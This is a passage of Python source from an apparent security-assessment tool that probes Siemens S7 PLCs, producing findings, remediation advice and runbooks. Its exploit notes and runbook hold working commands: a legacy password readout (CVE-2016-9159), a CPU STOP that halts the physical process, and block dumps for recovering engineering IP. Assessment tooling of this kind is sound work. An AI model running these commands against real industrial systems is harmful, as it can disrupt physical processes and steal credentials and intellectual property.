                    "Set protection level 2 (write-protect) or 3 (read+write "
                    "protect) with a strong password in the CPU properties.",
                    ["CWE-284", "CWE-306"], kind="s7_protection_level",
                    exploit_note=(
                        "snap7-client -h <ip> -c szl -i 0x0232 -x 4; if level=1, "
                        "DO NOT run stop against production. Test-cell prove: "
                        "snap7-client -h <ip> -c stop then snap7-client -c start."),
                    depth_tier="t1"))
            elif lvl in (2, 3):
                out.append(_finding(
                    "info", f"S7 CPU protection level = {lvl}", tgt,
                    f"SZL 0x0232 reports protection level {lvl} "
                    f"({'write' if lvl == 2 else 'read+write'} protected). "
                    "Legacy passwords are 8-byte SIMATIC-obfuscated and "
                    "offline-crackable if the readout succeeds.",
                    f"snap7-client -h {h.ip} -c szl -i 0x0232",
                    "Ensure the password is strong (16+ chars, mixed) — the "
                    "obfuscation is trivially reversible.",
                    ["CWE-284"], kind="s7_protection_level"))

            leg = pr.get("legacy_password_readout")
            if leg:
                out.append(_finding(
                    "critical",
                    "S7 legacy CPU password readout (CVE-2016-9159)", tgt,
                    f"SZL 0x0132 index 3 returned an 8-byte obfuscated CPU "
                    f"password: {leg['obfuscated_hex']}. The SIMATIC 8-byte "
                    f"obfuscation is XOR 0x55 with a byte-rotation and is "
                    f"immediately reversible — best-effort cleartext: "
                    f"{leg['cleartext_guess']!r}. On vulnerable firmware "
                    f"this readout requires no authentication.",
                    f"snap7-client -h {h.ip} -c szl -i 0x0132 -x 3",
                    "Patch to the Siemens firmware release addressing SSA-"
                    "731239. Rotate the CPU password and any HMI/engineering "
                    "station account that shared it.",
                    ["CWE-522", "CWE-327"], kind="s7_legacy_password_readout",
                    exploit_note=(
                        "Use the leg['cleartext_guess'] password: snap7-client "
                        "-h <ip> -c connect --password '<CLEARTEXT>'; then "
                        "snap7-client -c szl -i 0x0132; dump every OB with "
                        "snap7-client -c blockget -t OB -n <num>; NEVER write "
                        "OBs against production."),
                    depth_tier="t3"))

            if pr.get("s7_stack"):
                out.append(_finding(
                    "critical",
                    "S7 CPU STOP/START function reachable — process DoS "
                    "possible", tgt,
                    "S7COMM functions 0x29 (PLC STOP) and 0x28 (PLC START) "
                    "are accepted by any client that completes the S7 setup "
                    "handshake. On S7-300/400 with default protection level "
                    "1, no authentication is required — a single request "
                    "halts the physical process (CVE-2015-2177 class). Recce "
                    "does NOT invoke these from the probe; verify manually "
                    "under change control.",
                    f"# WARNING — halts the physical process:\n"
                    f"# snap7-client -h {h.ip} -c stop",
                    "Set protection level 3 with a strong password. On "
                    "1200/1500, keep PUT/GET disabled. Segment the CPU.",
                    ["CWE-284", "CWE-770", "CWE-1247"],
                    kind="s7_stop_start_possible",
                    exploit_note=(
                        "TEST-CELL ONLY: snap7-client -h <ip> -c stop; verify "
                        "SF LED on CPU face; snap7-client -c start to recover. "
                        "Never on production."),
                    depth_tier="t1"))

            blocks = pr.get("blocks") or {}
            if blocks:
                block_summary = ", ".join(
                    f"{k}={v}" for k, v in sorted(blocks.items()))
                out.append(_finding(
                    "medium",
                    "S7 block list enumerated (OB/FB/FC/DB inventory disclosed)",
                    tgt,
                    f"UserData subfunction 0x0D returned the CPU block "
                    f"inventory: {block_summary}. Program structure and DB "
                    f"numbers are now known — an attacker can target specific "
                    f"DBs for read/write (with PUT/GET enabled) or block "
                    f"upload (function 0x1B, needs no auth at level 1).",
                    f"snap7-client -h {h.ip} -c listblocks",
                    "Segment the CPU; block-list disclosure is inherent to "
                    "the protocol and cannot be disabled per-field.",
                    ["CWE-200"], kind="s7_block_list",
                    exploit_note=(
                        "For each DB in blocks: snap7-client -h <ip> -c "
                        "blockget -t DB -n <num>; write raw to disk and "
                        "disassemble with plctool/snap7 to recover "
                        "engineering IP."),
                    depth_tier="t1"))

            for m in pr.get("cve_matches") or []:
                out.append(_finding(
                    "high",
                    f"S7 firmware matches Siemens advisory ({m['cve']})", tgt,
                    f"Order code prefix identifies {m['family']}. "
                    f"{m['note']}. Confirm firmware version against the "
                    f"advisory before treating as exploitable — MLFB alone "
                    f"establishes family, not patch level.",
                    f"# check firmware against Siemens ProductCERT "
                    f"{m['cve']}",
                    f"Apply the Siemens firmware release addressing "
                    f"{m['cve']}; segment the CPU regardless.",
                    ["CWE-1395"], kind="s7_firmware_cve",
                    exploit_note=(
                        "Compare fw_version to Siemens ProductCERT SSA-***; "
                        "for CVE-2016-9159 confirm password readout worked; "
                        "for CVE-2020-15782 use TIA Portal / snap7-plus PoC "
                        "(private) against S7-1200 <V4.5."),
                    depth_tier="t1"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "COTP handshake + S7 setup communication",
         "cmd": f"plcscan {ip}"},
        {"step": "Read module identification (SZL 0x0011 — order code / firmware)",
         "cmd": f"snap7-client -h {ip} -c szl -i 0x0011"},
        {"step": "Read component identification (SZL 0x001C — plant/location/serial)",
         "cmd": f"snap7-client -h {ip} -c szl -i 0x001C"},
        {"step": "Read CPU protection level (SZL 0x0232 index 4)",
         "cmd": f"snap7-client -h {ip} -c szl -i 0x0232 -x 4"},
        {"step": "Attempt legacy password readout (CVE-2016-9159)",
         "cmd": f"snap7-client -h {ip} -c szl -i 0x0132 -x 3"},
        {"step": "MANUAL / DESTRUCTIVE — CPU STOP (drops the physical process)",
         "cmd": f"# snap7-client -h {ip} -c stop   # only under change control"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "s7", _DEFAULT_PORT)


def _record_asset(hosts: list[Host], ip: str, pr: dict) -> None:
    """Feed the S7 identity into core.known_ot_assets — every Siemens CPU
    reachable via S7COMM lands in the engagement-wide OT asset inventory."""
    order = pr.get("order_code") or ""
    fw = pr.get("fw_version") or ""
    serial = (pr.get("component") or {}).get("serial_number") or ""
    if not (order or serial):
        return
    family = ""
    mlfb = order.upper().replace(" ", "")
    if mlfb.startswith("6ES73"):
        family = "S7-300"
    elif mlfb.startswith("6ES74"):
        family = "S7-400"
    elif mlfb.startswith("6ES72"):
        family = "S7-1200"
    elif mlfb.startswith("6ES75"):
        family = "S7-1500"
    from ..core.known_ot_assets import record_ot_asset
    for h in hosts:
        if h.ip == ip:
            record_ot_asset(h, "s7", vendor="Siemens", model=order,
                            firmware=fw, serial=serial, cpu_family=family,
                            source="s7:szl-0x0011")
            break


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = s7_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["order_code"] = pr.get("order_code", "")
                t["fw_version"] = pr.get("fw_version", "")
                _record_asset(hosts, t["ip"], pr)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
